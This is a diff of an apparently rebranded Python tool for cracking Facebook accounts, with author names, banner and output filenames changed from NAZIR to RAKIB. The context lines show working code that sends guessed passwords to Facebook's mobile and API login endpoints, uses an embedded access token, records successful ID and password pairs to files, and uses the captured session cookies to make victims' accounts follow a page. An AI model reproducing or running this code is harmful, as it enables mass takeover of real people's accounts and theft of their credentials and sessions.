@@ -309,7 +309,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[NAZIR] %s/%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[RAKIB] %s/%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -324,17 +324,17 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;93m [NAZIR-OK ] {idf} | {pw}')
+				print( f'\r\x1b[1;93m [RAKIB-OK ] {idf} | {pw}')
 				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [NAZIR-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [RAKIB-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/SOMAIL-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/MR RAKIB-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -362,17 +362,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;92m [NAZIR-Ok] {idf} | {pw}')
+				rint( f'\r\x1b[1;92m [RAKIB-Ok] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [NAZIR-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [RAKIB-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/SOMAIL-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/MR RAKIB-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -388,22 +388,20 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
  
 logo = """
-\033[1;92m                                                
-   
- 8P d8P                                
- P d8P  Y8b Y8b Y888P  ,e e,   Y8b Y8Y 
-  d8P d  Y8b Y8b Y8P  d88 88b   Y8b Y  
- d8P d8   Y8b Y8b "   888   ,  e Y8b   
-d8P d88    YP  Y8P     "YeeP" d8b Y8b  
+\033[1;92m       88""Yb    db    88  dP 88 88""Yb 
+88__dP   dPYb   88odP  88 88__dP 
+88"Yb   dP__Yb  88"Yb  88 88""Yb 
+88  Yb dP""""Yb 88  Yb 88 88oodP 
                                                
  ╔══════════════════════════════════════════════╗
-    \33[0;41mPOWERD BY MUHAMMAD AJMALL NEW PUBLIC TOOLS\33[0m
+    \33[0;41mPOWERD BY  MR RAKIB
+    NEW PUBLIC TOOLS\33[0m
  ╚══════════════════════════════════════════════╝
   ║_________\33[1;46mNew Tools 2022\33[0m____________║
     \33[1;32m╔═════════════════════════════╗
-    \33[1;38m╠══[Author   : NAZIR XD  ZWEX ║
-    \33[1;32m╠══[FACEBOOK : MUHAMMAD AJMALL║
-    \33[1;35m╠══[CREATED  : ZWEX BRAND     ║
+    \33[1;38m╠══[Author   : MR RAKIB║
+    \33[1;32m╠══[FACEBOOK : MD RAKIB HOSSEN║
+    \33[1;35m╠══[CREATED  : MR RAKIB   ║
     \33[1;37m╠══[NETWORK  : \33[1;34mSPEED 4G \33[1;36m      ║
     \33[1;37m╠══[TOOLS    : \33[1;38mFREE \33[1;37m          ║
     \33[1;34m╠══[VERSION  : \33[1;31m0.01 \33[1;38m          ║
@@ -434,7 +432,7 @@ class Main:
 			print("    Thanks♥️")
 			exit()
 		elif Baloch in ["1", "01"]:
-			os.system("xdg-openhttps://www.facebook.com/NaZerkhaN521")
+			os.system("xdg-open https://www.facebook.com/Itz.RAKiB.Sakib.Take.love")
 			print("")
 			time.sleep(2.0)
 			print("\033[1;33m    Checking Subsacribetion")
@@ -885,15 +883,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[NAZIR-OK]%s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[RAKIB-OK]%s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("SOMAIL-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[NAZIR-Cp] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[RAKIB-Cp] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("NAZIR-Cp.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("RAKIB-Cp.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1316,15 +1314,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[NAZIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[RAKIB-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-MRD-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;93m[NAZIR-OK] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;93m[RAKIB-OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-KAVIDU-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-RAKIB-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
